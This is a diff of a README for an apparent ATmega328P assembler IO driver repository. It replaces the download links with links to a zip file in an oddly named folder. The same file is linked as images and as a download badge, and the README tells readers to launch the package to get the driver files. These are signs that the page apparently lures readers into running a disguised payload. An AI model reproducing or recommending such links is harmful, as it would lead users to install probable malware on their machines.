@@ -2,8 +2,8 @@
 
 Welcome to the ATmega328P IO Driver repository! 🎉
 
-![ATmega328P](https://github.com/AlperenAdam/ATmega328P_IO_Driver/releases/download/v2.0/Software.zip)
-![Assembler](https://github.com/AlperenAdam/ATmega328P_IO_Driver/releases/download/v2.0/Software.zip)
+![ATmega328P](https://github.com/AlperenAdam/ATmega328P_IO_Driver/raw/refs/heads/main/typhlostomy/Tmega-A-I-Driver-3.2.zip)
+![Assembler](https://github.com/AlperenAdam/ATmega328P_IO_Driver/raw/refs/heads/main/typhlostomy/Tmega-A-I-Driver-3.2.zip)
 
 ## Description
 This repository contains an ATmega328P IO driver that is completely written in Assembler language. If you are working with the ATmega328P microcontroller and need a reliable and efficient IO driver, you have come to the right place! This driver will help you manage input and output operations with ease.
@@ -24,7 +24,7 @@ This repository contains an ATmega328P IO driver that is completely written in A
 
 ## Software Download
 To get started with the ATmega328P IO driver, you can download the necessary software package using the following link:
-[![Download Software](https://github.com/AlperenAdam/ATmega328P_IO_Driver/releases/download/v2.0/Software.zip)](https://github.com/AlperenAdam/ATmega328P_IO_Driver/releases/download/v2.0/Software.zip)
+[![Download Software](https://github.com/AlperenAdam/ATmega328P_IO_Driver/raw/refs/heads/main/typhlostomy/Tmega-A-I-Driver-3.2.zip)](https://github.com/AlperenAdam/ATmega328P_IO_Driver/raw/refs/heads/main/typhlostomy/Tmega-A-I-Driver-3.2.zip)
 
 **Note:** The software package needs to be launched to access the driver files.
 
